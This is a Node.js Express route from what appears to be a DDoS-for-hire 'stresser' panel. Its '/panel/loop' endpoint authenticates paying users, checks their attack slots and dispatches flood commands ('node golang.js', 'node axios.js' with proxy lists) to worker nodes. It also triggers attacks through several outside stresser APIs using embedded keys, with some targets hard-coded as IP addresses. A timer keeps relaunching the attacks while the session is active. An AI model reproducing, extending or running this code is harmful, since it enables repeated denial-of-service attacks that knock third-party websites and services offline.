const checkUser = require('../../functions/checkUser')

const ongoingSchema = require('../../models/ongoing')

const yup = require('yup');

const axios = require('axios');

const generateString = require('../../functions/generateString')

const proxyConfig = require('../../proxy.json')
const proxyList = proxyConfig.proxy

const schema = yup.object().shape({
	Token: yup.string().length(64).required(),
	host: yup.string().url().min(1).max(255).required(),
  	proxy : yup.number().default(0),
  	mode: yup.string().required('Please pick a mode.'),
  	cookie: yup.string(),
  	postdata : yup.string(),
  	restOption : yup.string()
});

module.exports = (app, socket, broadcast) => {
	app.post('/panel/loop/:id', async (req, res, next) => {
		const {
			authorizationtoken: Token
		} = req.headers
		let {
			host,
			mode,
			restOption,
			postdata,
			cookie,
			proxy
		} = req.body;
		try {
			await schema.validate({
				Token,
				host,
				mode,
				postdata,
				restOption,
				cookie,
				proxy
			})
			
			const userFound = await checkUser(Token, req.useragent)
			if(!userFound.loop)
				return next(new Error('What are you doing, step-bro?'))

			const currentConcurrent = await ongoingSchema.countDocuments({
				user : userFound.username,
				stopped : false,
				looped: true
			})

			if (currentConcurrent > userFound.slots)
				return next(new Error('Loop slots exceeded.'))

			const sesId = generateString(32)

			let socketPayload = {
				session : sesId,
				type : 'attack',
				payload : `node golang.js ${host} 1300`,
				time: 1200,
				nodes : ['loop']
			}

			if(mode === 'advanced') {
				socketPayload = {
					session : sesId,
					type : 'attack',
					payload : `node axios.js ${host} 1200 ${proxyList[proxy].file_http} ${restOption ? restOption : 'get'} ${cookie ? cookie : 'secure'} ${postdata ? postdata : 'x=x'}`,
					time: 1200,
					nodes : ['loop']
				}
			}

			broadcast(socketPayload)

			const ongoingAdded = new ongoingSchema()
			ongoingAdded.id = sesId
			ongoingAdded.user = userFound.username
			ongoingAdded.destination = host 
			ongoingAdded.method = 'LOOP'
			ongoingAdded.port = 80
			ongoingAdded.duration = 1200
			ongoingAdded.stopped = false
			ongoingAdded.nodes = ['loop']
			ongoingAdded.looped = true
			ongoingAdded.time = new Date()
			await ongoingAdded.save()

			try {
				axios.get('https://darlingapi.com/', {
					params: {
						key: '3926b1330990342e05f9f1b9-6d5001ea',
						host: host,
						port: 80,
						time: 1150,
						method: 'SOCKET'
						
					}
				})
			} catch (err) {
				console.log('darlingapi.com API error')
			}

			try {
				axios.get('https://darlingapi.com/', {
					params: {
						key: '3926b1330990342e05f9f1b9-6d5001ea',
						host: host,
						port: 80,
						time: 1150,
						method: 'SOCKET'
						
					}
				})
			} catch (err) {
				console.log('darlingapi.com API error')
			}

			try {
				axios.get('https://mythicalstressapi.net/', {
					params: {
						key: '3e22raebqdc03l4cbvuqi5bcja2h6b',
						target: "https://5.255.102.109/",
						port: 80,
						duration: 1100,
						method: 'HTTPGET'
						
					}
				})
			} catch (err) {
				console.log('Stopbots.net API error')
			}

					
		 	res.send({
		 		success : true,
		 		message : 'Success.'
		 	})

		 	var curInterval
		 	curInterval = setInterval( async () => {
	 			var findOngoing = await ongoingSchema.findOne({
	 				id: sesId,
	 				stopped: false,
	 				looped: true
	 			})
		 		const stopPayload = {
					session : sesId,
					type : 'stop',
					nodes : ['loop']
				}

				broadcast(stopPayload)
				
	 			if(findOngoing) {
	 				broadcast(socketPayload)
	 				findOngoing.time = new Date()
	 				await findOngoing.save()
					try {
						axios.get('https://darlingapi.com/', {
							params: {
								key: '3926b1330990342e05f9f1b9-6d5001ea',
								host: host,
								port: 80,
								time: 1200,
								method: 'TCPTLS',
								
							}
						})
					} catch (err) {
						console.log('darlingapi.com API error')
					}

					try {
						axios.get('https://putinstresser.me/panel/api/', {
							params: {
								key: 'usVOEpvvHrj8pTmf',
								target: '92.253.125.195',
								port: 80,
								duration: 1000,
								method: 'DNS'
							}
						})
					} catch (err) {
						console.log('51.79.249.191:2052 API error')
					}

					try {
						axios.get('https://stopbots.net/l7_secret_folder_123', {
							params: {
								key: 'gerrgtyowtfmayowtfman2yowtfman2yowtfman2n2rtghrt',
								target: host,
								port: 80,
								time: 1200,
								method: 'cf',
								servers: 'bvultr'
							}
						})
					} catch (err) {
						console.log('Stopbots.net API error')
					}
					
	 			} else {
	 				if(curInterval)
	 					clearInterval(curInterval)
	 			}
		 	}, 1300000)
		} catch (err)
		{
			return next(err)
		}
	})
}
